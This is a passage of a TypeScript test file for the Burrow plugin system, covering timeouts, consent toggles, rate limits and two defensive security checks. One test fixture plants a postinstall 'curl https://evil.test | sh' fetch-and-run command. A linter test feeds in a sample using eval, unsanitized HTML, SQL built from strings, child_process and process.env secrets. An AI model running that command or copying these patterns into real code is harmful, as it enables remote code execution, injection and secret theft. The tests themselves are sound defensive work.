          permissions: ['db:own', 'routes:public', 'events:before', 'events:read'],
          network: ['api.example.com'],
          configKeys: ['QUOTA_API_KEY'],
          dialects: ['sqlite'],
        },
        setup(ctx) {
          ctx.defineRoute({
            method: 'GET',
            path: '/ping',
            public: true,
            schemas: {},
            handler(c: any) {
              return c.json({ pong: true });
            },
          });
          ctx.defineRoute({
            method: 'GET',
            path: '/slow',
            public: true,
            schemas: {},
            async handler(c: any) {
              await new Promise((r) => setTimeout(r, 150));
              return c.json({ ok: true });
            },
          });
        },
      };

      const app = createCoreApp(
        createStubInfra(sqlite, {
          userId: 'u_owner',
          userRoleByWs: { ws_1: 'owner' },
          listOwnedWorkspaces: [{ id: 'ws_1', role: 'owner' }],
        }),
        {
          policy: new SelfHostedPolicy(),
          plugins: [quotaPlugin],
          rawDb: sqlite,
          pluginRuntimeRegistry: registry,
          pluginRouteTimeoutMs: 40,
        },
      );

      // Slow handler returns 504
      expect((await app.request('http://localhost/api/plugins/quota/slow')).status).toBe(504);

      // Admin GET /api/plugins lists manifest & consent summary
      const listRes = await app.request('http://localhost/api/plugins');
      expect(listRes.status).toBe(200);
      const listJson = (await listRes.json()) as { plugins: Array<{ id: string; enabled: boolean }> };
      expect(listJson.plugins[0]).toMatchObject({ id: 'quota', enabled: true });
      const summary = formatPluginConsentSummary(quotaPlugin.manifest);
      expect(summary).toContain('Quota Test Plugin');
      expect(summary).toContain('This plugin can:');
      expect(summary).toContain('api.example.com');
      expect(summary).toContain('QUOTA_API_KEY');

      // Runtime toggle disables plugin immediately (503) without redeploy
      const disableRes = await app.request('http://localhost/api/plugins/quota/toggle', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ enabled: false }),
      });
      expect(disableRes.status).toBe(200);
      expect((await app.request('http://localhost/api/plugins/quota/ping')).status).toBe(503);

      // Re-enabling without consentAccepted rejected (400), with consentAccepted succeeds
      expect(
        (await app.request('http://localhost/api/plugins/quota/toggle', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ enabled: true, consentAccepted: false }),
        })).status,
      ).toBe(400);
      expect(
        (await app.request('http://localhost/api/plugins/quota/toggle', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ enabled: true, consentAccepted: true }),
        })).status,
      ).toBe(200);

      // Per-plugin rate limit (120 req/min cap -> line 914's /slow consumed 1 req; 119 more pass, 121st returns 429)
      for (let i = 0; i < 119; i++) {
        const res = await app.request('http://localhost/api/plugins/quota/ping', {
          headers: { 'x-forwarded-for': '203.0.113.99' },
        });
        expect(res.status).toBe(200);
      }
      expect(
        (
          await app.request('http://localhost/api/plugins/quota/ping', {
            headers: { 'x-forwarded-for': '203.0.113.99' },
          })
        ).status,
      ).toBe(429);

      // Canonical PLUGINS_DISABLED (both string ID, constructor shorthand, and '*' wildcard) + deprecated DISABLED_PLUGINS warning
      const shorthandReg = new PluginRuntimeRegistry('quota');
      shorthandReg.register(quotaPlugin.manifest);
      expect(shorthandReg.isEnabled('quota')).toBe(false);

      const wildcardReg = new PluginRuntimeRegistry({ pluginsDisabledEnv: '*' });
      wildcardReg.register(quotaPlugin.manifest);
      expect(wildcardReg.isEnabled('quota')).toBe(false);

      const warnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
      const deprecatedReg = new PluginRuntimeRegistry({ disabledPluginsEnv: 'quota' });
      deprecatedReg.register(quotaPlugin.manifest);
      expect(deprecatedReg.isEnabled('quota')).toBe(false);
      expect(warnSpy).toHaveBeenCalledWith(
        expect.stringContaining('DISABLED_PLUGINS is deprecated; use PLUGINS_DISABLED'),
      );
      warnSpy.mockRestore();

      // Restored c661369 probe: before* throwing guard & timeout abort cleanly, while emitAfter dispatches non-blocking
      const bus = new PluginEventBus();
      bus.onBefore('task.created', () => {
        throw new TypeError('unexpected bug in plugin guard');
      });
      await expect(
        bus.emitBefore('task.created', {
          workspaceId: 'ws_1',
          projectId: 'p1',
          boardId: 'b1',
          columnId: 'c1',
          cardId: 'card1',
          notepadId: 'np1',
          title: 'Test',
          actorId: 'u_owner',
        }),
      ).rejects.toThrow(TypeError);

      let slowAfterDone = false;
      bus.on('notepad.saved', async () => {
        await new Promise((r) => setTimeout(r, 80));
        slowAfterDone = true;
      });
      await bus.emitAfter('notepad.saved', {
        workspaceId: 'ws_1',
        projectId: 'p1',
        notepadId: 'np_1',
        version: 1,
        actorId: 'u_owner',
        content: '[]',
      });
      expect(slowAfterDone).toBe(false);
    } finally {
      sqlite.close();
    }
  });

  it('10. Supply Chain: validatePluginDirectory blocks postinstall scripts, unpinned versions, missing lockfile, copyleft deps, and offline CVEs', () => {
    // Bad plugin directory
    const badDir = createTempDir('burrow-supply-bad-');
    fs.writeFileSync(
      path.join(badDir, 'package.json'),
      JSON.stringify({
        name: 'supply-bad',
        version: '0.1.0',
        license: 'UNKNOWN',
        scripts: { postinstall: 'curl https://evil.test | sh' },
        dependencies: { lodash: '^4.17.15' },
      }),
    );
    fs.mkdirSync(path.join(badDir, 'node_modules', 'bad-copyleft-dep'), { recursive: true });
    fs.writeFileSync(
      path.join(badDir, 'node_modules', 'bad-copyleft-dep', 'package.json'),
      JSON.stringify({ name: 'bad-copyleft-dep', version: '1.0.0', license: 'GPL-3.0' }),
    );

    const badRes = validatePluginDirectory(badDir);
    expect(badRes.ok).toBe(false);
    const rules = new Set(badRes.findings.map((f: { rule: string }) => f.rule));
    expect(rules.has('package-license')).toBe(true);
    expect(rules.has('blocked-lifecycle-script')).toBe(true);
    expect(rules.has('unpinned-dependency')).toBe(true);
    expect(rules.has('vulnerable-dependency')).toBe(true);
    expect(rules.has('missing-lockfile')).toBe(true);
    expect(rules.has('dependency-license')).toBe(true);

    // Clean pinned plugin directory passes
    const goodDir = createTempDir('burrow-supply-good-');
    fs.writeFileSync(
      path.join(goodDir, 'package.json'),
      JSON.stringify({
        name: 'supply-good',
        version: '0.1.0',
        license: 'MIT',
        dependencies: { '@burrow/sdk': '0.4.0' },
      }),
    );
    fs.writeFileSync(path.join(goodDir, 'pnpm-lock.yaml'), 'lockfileVersion: "9.0"\n');
    fs.writeFileSync(
      path.join(goodDir, 'manifest.json'),
      JSON.stringify({
        id: 'supply-good',
        version: '0.1.0',
        sdkVersion: '^0.4.0',
        permissions: ['routes:api'],
        dialects: ['sqlite', 'postgres'],
        network: ['api.example.com'],
        configKeys: ['API_TOKEN'],
      }),
    );
    fs.writeFileSync(
      path.join(goodDir, 'index.ts'),
      `import { sanitizePluginHtml } from '@burrow/sdk';\nexport const render = (html: string) => sanitizePluginHtml(html);\n`,
    );

    const goodRes = validatePluginDirectory(goodDir);
    expect(goodRes.findings).toEqual([]);
    expect(goodRes.ok).toBe(true);
  });

  it('11. Static Checks (@burrow/eslint-plugin): flags eval, new Function, unsanitized HTML, raw fetch, process.env, string SQL, and child_process', () => {
    const linter = new Linter({ configType: 'flat' });
    const config = [
      {
        files: ['**/*.{ts,tsx,js}'],
        languageOptions: {
          parser: tseslint.parser,
          parserOptions: { ecmaVersion: 'latest', sourceType: 'module', ecmaFeatures: { jsx: true } },
        },
        plugins: { '@burrow': burrowEslintPlugin },
        rules: recommendedRules,
      },
    ];

    const hostileSource = `
      import { execSync } from 'node:child_process';
      export function bad(db: any, userHtml: string, el: HTMLElement, id: string) {
        eval('1+1');
        new Function('return 1')();
        el.innerHTML = userHtml;
        fetch('https://example.com');
        const secret = process.env.BETTER_AUTH_SECRET;
        const built = \`SELECT * FROM plugin_x_t WHERE id = '\${id}'\`;
        db.query(built);
        return { execSync, secret };
      }
      export function BadComponent({ html }: { html: string }) {
        return <div dangerouslySetInnerHTML={{ __html: html }} />;
      }
    `;
    const messages = linter.verify(hostileSource, config, 'plugin.tsx');
    const ruleIds = new Set(messages.map((m) => m.ruleId));
    expect(ruleIds.has('@burrow/no-child-process')).toBe(true);
    expect(ruleIds.has('@burrow/no-unsafe-eval')).toBe(true);
    expect(ruleIds.has('@burrow/no-unsanitized-html')).toBe(true);
    expect(ruleIds.has('@burrow/no-raw-fetch')).toBe(true);
    expect(ruleIds.has('@burrow/no-process-env')).toBe(true);
    expect(ruleIds.has('@burrow/no-string-sql')).toBe(true);

    const safeSource = `
      import { sanitizePluginHtml, sql } from '@burrow/sdk';
      export async function good(ctx: any, id: string, rawHtml: string) {
        await ctx.fetch('https://api.example.com/ok');
        const rows = await ctx.db.query(sql\`SELECT id FROM \${ctx.db.table('items')} WHERE id = \${id}\`);
        const safe = sanitizePluginHtml(rawHtml);
        return { rows, safe, token: ctx.config.API_KEY };
      }
      export function GoodComponent({ html }: { html: string }) {
        return <div dangerouslySetInnerHTML={{ __html: sanitizePluginHtml(html) }} />;
      }
    `;
    expect(linter.verify(safeSource, config, 'safe.tsx')).toEqual([]);
  });
});
